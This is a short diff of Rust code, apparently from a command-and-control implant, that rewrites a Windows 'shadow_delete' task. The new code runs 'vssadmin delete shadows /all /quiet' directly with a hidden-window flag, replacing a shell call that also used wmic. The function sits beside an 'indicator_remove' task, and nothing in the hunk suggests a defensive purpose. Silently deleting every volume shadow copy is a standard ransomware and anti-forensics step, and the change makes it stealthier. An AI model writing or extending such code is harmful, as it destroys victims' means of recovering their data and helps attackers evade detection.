@@ -268,11 +268,17 @@ fn indicator_remove(v: &serde_json::Value) -> TaskOutput {
 
 #[cfg(target_os = "windows")]
 fn shadow_delete() -> TaskOutput {
-    // Requires admin/SYSTEM — route through shell
-    let cmd = "vssadmin delete shadows /all /quiet & wmic shadowcopy delete /nointeractive";
-    shell_run(cmd)
-        .map(|out| TaskOutput::success(out))
-        .unwrap_or_else(|e| TaskOutput::failure(&e))
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x08000000;
+    let windir = std::env::var("WINDIR").unwrap_or_else(|_| "C:\\Windows".into());
+    match std::process::Command::new(format!("{windir}\\System32\\vssadmin.exe"))
+        .args(["delete", "shadows", "/all", "/quiet"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+    {
+        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); TaskOutput::success(d) }
+        Err(e) => TaskOutput::failure(&e.to_string()),
+    }
 }
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
